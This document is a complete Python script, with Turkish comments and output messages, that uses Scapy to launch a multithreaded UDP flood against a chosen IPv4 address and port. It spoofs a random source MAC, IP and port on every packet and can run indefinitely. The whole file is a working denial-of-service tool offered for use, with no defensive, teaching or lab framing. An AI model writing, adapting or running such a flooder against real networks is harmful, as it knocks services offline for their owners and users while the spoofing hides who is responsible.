#!/usr/bin/env python3
import argparse
import threading
import time
import random
from scapy.all import (


    Raw,
    sendp,
    RandMAC
)

from scapy.layers.l2 import Ether
from scapy.layers.inet import IP , UDP
def parse_args():
    parser = argparse.ArgumentParser(
        description="UDP Flood + MAC/IP Shroud w/ Delays"
    )
    parser.add_argument(
        "--iface", required=True,
        help="Interface to send packets on"
    )
    parser.add_argument(
        "-p", "--port", type=int, default=80,
        help="Destination port (default: 80)"
    )
    parser.add_argument(
        "-s", "--size", type=int, default=1472,
        help="Payload size in bytes (default: 1472)"
    )
    parser.add_argument(
        "-t", "--threads", type=int, default=4,
        help="Number of threads (default: 4)"
    )
    parser.add_argument(
        "--timeout", type=int, default=0,
        help="Flood duration in seconds (0 = infinite, default: 0)"
    )
    parser.add_argument(
        "target",
        help="Target IPv4 address"
    )
    return parser.parse_args()

def build_packet(dst_ip, dst_port, payload_size):
    # Kaynak MAC ve IP’i her pakette rastgele seç
    src_mac = RandMAC()
    src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
    src_port = random.randint(1024, 65535)
    payload = Raw(load=bytes(random.randint(0, 255) for _ in range(payload_size)))
    pkt = (
        Ether(src=src_mac) /
        IP(src=src_ip, dst=dst_ip) /
        UDP(sport=src_port, dport=dst_port) /
        payload
    )
    return pkt

def flood(iface, target, port, size, stop_event):
    while not stop_event.is_set():
        pkt = build_packet(target, port, size)
        sendp(pkt, iface=iface, verbose=False)
        # Gerekirse burada çok küçük bir gecikme ekleyebilirsiniz:
        # time.sleep(0.001)

def main():
    args = parse_args()
    stop_event = threading.Event()
    print(
        f"→ Flood başlatılıyor: {args.target}:{args.port} üzerinden, "
        f"{args.threads} thread, payload size {args.size} B, "
        f"{'süresiz' if args.timeout == 0 else f'{args.timeout}s'}"
    )

    # Flood thread’lerini ayağa kaldır
    threads = []
    for _ in range(args.threads):
        t = threading.Thread(
            target=flood,
            args=(args.iface, args.target, args.port, args.size, stop_event),
            daemon=True
        )
        t.start()
        threads.append(t)

    # Süre ayarı
    try:
        if args.timeout > 0:
            time.sleep(args.timeout)
            stop_event.set()
        else:
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        stop_event.set()
    finally:
        for t in threads:
            t.join()
        print("✋ Flood durduruldu.")

if __name__ == "__main__":
    main()
